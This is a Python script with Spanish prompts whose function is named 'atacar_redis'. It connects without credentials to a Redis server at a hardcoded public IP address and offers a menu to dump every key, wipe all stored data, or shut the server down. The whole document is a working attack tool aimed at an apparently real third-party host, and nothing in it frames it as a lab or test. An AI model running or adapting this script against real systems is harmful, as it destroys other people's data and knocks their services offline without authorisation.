import redis


def atacar_redis():
    host = "82.29.173.93"  # input("Ingrese la IP del servidor Redis: ")
    port = 6379  # Puerto por defecto de Redis

    try:
        r = redis.Redis(host=host, port=port, db=0)
        r.ping()  # Verifica la conexión
        print("\nConexión exitosa al servidor Redis.")

        while True:
            print("\nMenu de opciones:")
            print("1. Listar todas las claves")
            print("2. Eliminar todos los datos (FLUSHALL)")
            print("3. Apagar el servidor (SHUTDOWN)")
            print("4. Salir")

            opcion = input("Seleccione una opción: ")

            if opcion == "1":
                claves = r.keys("*")
                print(f"\nClaves en la base de datos: {claves}")

            elif opcion == "2":
                confirmacion = input(
                    "¿Está seguro de eliminar TODOS los datos? (s/n): "
                )
                if confirmacion.lower() == "s":
                    r.flushdb()
                    print("\nTodos los datos han sido eliminados.")
                else:
                    print("\nOperación cancelada.")

            elif opcion == "3":
                try:
                    r.shutdown()
                    print("\nEl servidor se está apagando.")
                    break
                except Exception as e:
                    if "not permitted" in str(e).lower():
                        print("\nNo tiene permisos para apagar el servidor.")
                    else:
                        print(f"\nError al intentar apagar el servidor: {e}")

            elif opcion == "4":
                print("Saliendo...")
                break

            else:
                print("\nOpción inválida. Por favor, seleccione una opción válida.")

    except Exception as e:
        if "connection" in str(e).lower():
            print(f"\nNo se pudo establecer conexión con el servidor {host}:{port}")
        else:
            print(f"\nOcurrió un error: {e}")


if __name__ == "__main__":
    atacar_redis()
